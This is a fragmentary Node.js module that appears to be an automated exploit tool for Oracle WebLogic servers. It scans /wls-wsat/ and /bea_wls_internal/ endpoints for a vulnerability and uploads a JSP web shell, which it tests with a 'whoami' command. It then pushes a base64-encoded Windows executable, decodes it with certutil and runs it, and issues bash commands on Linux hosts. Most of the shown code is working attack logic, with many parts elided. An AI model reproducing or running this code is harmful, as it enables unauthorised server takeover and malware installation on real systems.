module.exports={
  ...
  fnCheckWebShell:function(xUrl,fnCbk2,cmd)
  {
    ...
    _s.request.get(oOpt,function(e,r,b)
    {
      if(e)return _s.error(e);
      var szRk = "ip:"
      // _s.log("curl '" + xUrl + "'");
      b = String(b);
      // console.log( b);
...
*/});
    var oUrls ={},szRk = "ip:", g_nFlg = 0, szJspName = "X11.jsp",fnTmp1,ks5;
        ...
        if(-1 < u.indexOf('/wls-wsat/')||-1 < u.indexOf('/bea_wls_internal/'))
        {
          ...
          for(var j = 0; j < aT.length; j++)
          {
            ...
            (function(xUrl)
            {
              ...
              // console.log("test " + xUrl);
              _s.request.get({uri:xUrl,timeout:200},function(e,r,b)
              {
                if(e || !b)return;
    ...
    fnTmp1 = function(p11,szPld,fnTmpCbk,szTUrl,fnCbk2)
        {
          ...
          _t.sendPayload(url,szPld||s, oOpt, function (error, response, body)
          {
              ...
              if(-1 < body.indexOf("Error: ESOCKETTIMEDOUT"))body = "ESOCKETTIMEDOUT",error=null;
              _s.error(error);
              ...
              if(nT >= nT2 && -1 < String(body).indexOf("<faultstring>0</faultstring>"))
              {
                ...
                if(r && r.vul)
                {
                   ...
                   else
                   {
                       ...
                       var szUrl = [hst.protocol,"//", hst.host,aPath[0]].join(""), ckCbk = null,szJspPayload;
                       _t.uploadPayload("servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/" + szJspName,
                          szJspPayload = _s.fs.readFileSync("payload/x.jsp").toString("utf-8"),szUrl,ckCbk = function()
                      {
                        _t.fnCheckWebShell([hst.protocol,"//", hst.host,"/bea_wls_internal/",szJspName,"?ls=whoami"].join(""));
                      });

                       // sen
                       _s.log("send payload: win exe2txt ./noWWW_P65533.txt");
                          ...
                          szJspPayload = _s.fs.readFileSync("payload/noWWW_P65533.exe").toString("base64"),szUrl,ckCbk = function()
                      {
                          ...
                          _t.cmdPayload(szUrl,'cmd.exe', "certutil -decode noWWW_P65533.txt noWWW_P65533.exe;noWWW_P65533.exe",function()
                          {
                            console.log("noWWW_P65533.exe");
                          });
                      });
                       ...
                       _t.uploadPayload(szJspName, szJspPayload,szUrl,function(){
                          ...
                          {
                            fCbk('','','',[hst.protocol,"//", hst.host,"/bea_wls_internal/",szJspName,"?ls=whoami"].join(""));
                          };
                       ...
                       // console.log([oCTmp.c,szJspName]);
                       _s.log("send payload: linux, bash make all war/" + szJspName);
                       _t.cmdPayload(szUrl,'/bin/bash',s1_1);
